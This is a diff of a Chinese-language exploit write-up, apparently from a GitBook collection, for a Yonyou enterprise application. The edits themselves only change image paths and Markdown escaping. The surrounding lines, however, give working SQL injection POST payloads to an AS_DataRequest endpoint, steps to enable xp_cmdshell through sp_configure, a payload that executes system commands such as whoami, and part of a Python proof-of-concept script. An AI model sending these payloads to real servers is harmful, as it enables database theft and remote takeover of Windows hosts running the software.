@@ -34,21 +34,19 @@ cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATA
 
 请求后按F12查看源代码可以得到SQL语句查询结果
 
-![yongyou-7-1](images/yongyou-7-1.png)
+![yongyou-7-1](../.gitbook/assets/yongyou-7-1.png)
 
+![yongyou-7-2](../.gitbook/assets/yongyou-7-2.png)
 
+也可以调用 **xp\_cmdshell** 来执行系统命令(大部分此系统为**windows**)
 
-![yongyou-7-2](images/yongyou-7-2.png)
+![yongyou-7-3](../.gitbook/assets/yongyou-7-3.png)
 
-也可以调用 **xp_cmdshell** 来执行系统命令(大部分此系统为**windows**)
+* 注意：大部分默认是不开启 xp\_cmdshell 模块的
 
-![yongyou-7-3](images/yongyou-7-3.png)
+![yongyou-7-4](../.gitbook/assets/yongyou-7-4.png)
 
-- 注意：大部分默认是不开启 xp_cmdshell 模块的
-
-![yongyou-7-4](images/yongyou-7-4.png)
-
-可以使用如下方法打开**xp_cmdshell方法**
+可以使用如下方法打开**xp\_cmdshell方法**
 
 将如下POST数据按顺序发送(**注意 master 改为当前数据库名**)
 
@@ -72,12 +70,7 @@ cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATA
 cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA format="text">reconfigure</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>
 ```
 
-- 发送如上实际为执行SQL语句打开 xp_cmdshell
-  use master;
-  exec sp_configure 'show advanced options',1;
-  reconfigure;
-  exec sp_configure 'xp_cmdshell',1;
-  reconfigure;
+* 发送如上实际为执行SQL语句打开 xp\_cmdshell use master; exec sp\_configure 'show advanced options',1; reconfigure; exec sp\_configure 'xp\_cmdshell',1; reconfigure;
 
 再发送以下数据可成功使用(也可能失败)
 
@@ -85,7 +78,7 @@ cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATA
 cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA format="text">exec xp_cmdshell "whoami"</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>
 ```
 
-- 执行过程中报错 java.sql.SQLException【错误代码: 0; 相关信息:xxxxxx】不用理会
+* 执行过程中报错 java.sql.SQLException【错误代码: 0; 相关信息:xxxxxx】不用理会
 
 发送请求后再使用此模块则会成功请求执行系统命令
 
@@ -231,4 +224,4 @@ if __name__ == '__main__':
             POC_3(target_url, cmd)
 ```
 
-![yongyou-7-5](images/yongyou-7-5.png)
+![yongyou-7-5](../.gitbook/assets/yongyou-7-5.png)
